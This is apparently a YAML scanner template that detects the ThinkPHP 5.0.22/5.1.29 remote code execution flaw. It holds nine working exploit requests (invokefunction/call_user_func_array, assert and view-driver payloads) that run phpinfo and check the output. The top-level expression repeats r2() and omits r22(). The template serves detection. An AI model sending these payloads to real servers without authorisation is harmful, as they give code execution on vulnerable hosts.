expression: r0() || r1() || r2() || r00() || r11() || r2() || r000() || r111() ||
  r222()
id: thinkphp-5022-5129-rce
info:
  author: zan8in
  description: Thinkphp5 5.0.22/5.1.29 Remote Code Execution if the website doesn't
    have mandatory routing enabled (which is default).
  name: ThinkPHP 5.0.22 RCE
  reference:
  - https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
  r00:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
  r000:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/api/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
  r11:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
  r111:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/api/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
  r2:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/index/\think\view\driver\php/display&content=<?php%20phpinfo();?>
  r22:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/admin/\think\view\driver\php/display&content=<?php%20phpinfo();?>
  r222:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=/api/\think\view\driver\php/display&content=<?php%20phpinfo();?>
